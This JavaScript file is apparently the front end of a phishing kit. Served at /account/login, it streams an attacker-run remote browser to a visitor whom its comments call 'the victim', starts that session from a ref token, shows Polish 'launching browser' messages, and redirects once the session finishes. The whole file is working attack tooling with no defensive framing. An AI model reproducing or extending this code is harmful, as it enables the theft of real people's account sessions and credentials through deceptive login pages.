// Viewer page — loaded at /account/login?ref=<numeric-ref>
// The ref serves as the access token for the victim's WebSocket connection.
const params = new URLSearchParams(location.search);
const ref = params.get('ref') || '';

const viewer = new SocialPanelViewer(document.querySelector('#screen'));
const overlay = document.querySelector('#loadingOverlay');
const overlayStatus = document.querySelector('#overlay-status');

function fail(msg) {
  document.body.innerHTML = `<p style="color:#fff;padding:2em;font:16px sans-serif">${msg}</p>`;
}

function setOverlayText(msg) {
  if (overlayStatus) overlayStatus.textContent = msg;
}

let _ready = false;
viewer.onReady = () => { _ready = true; if (overlay) overlay.classList.add('hidden'); };
viewer.onredirect = (url) => { const saved = localStorage.getItem('return_url'); window.location.href = saved || url || '/'; };

if (!ref) { fail('Brak ref. Wróć do panelu.'); }
else {
  let _accountId = null;
  let _retries = 0;

  function startAndConnect() {
    fetch(`/api/account-by-ref/${encodeURIComponent(ref)}/start`, {
      method: 'POST',
      credentials: 'same-origin',
    })
      .then(async (res) => {
        if (res.status === 404) { fail('Nieznany link.'); return; }
        const { accountId } = await res.json();
        _accountId = accountId;
        connect();
      })
      .catch(() => {
        if (_retries < 30) {
          _retries++;
          setOverlayText(`Uruchamiam przeglądarkę\u2026 (${_retries})`);
          setTimeout(startAndConnect, 3000);
        } else {
          fail('Błąd połączenia.');
        }
      });
  }

  function connect() {
    viewer.onclose = (ev) => {
      if (_ready) return;
      if (ev.code === 4409 && _retries < 30) {
        _retries++;
        setOverlayText(`Uruchamiam przeglądarkę\u2026 (${_retries})`);
        setTimeout(startAndConnect, 2000);
      } else if (ev.code === 4404) {
        fail('Nieznany link.');
      } else {
        fail(`Błąd połączenia (${ev.code || 'WS closed'}).`);
      }
    };
    viewer.connect(_accountId, ref);
  }

  setOverlayText('Uruchamiam przeglądarkę\u2026');
  startAndConnect();
}
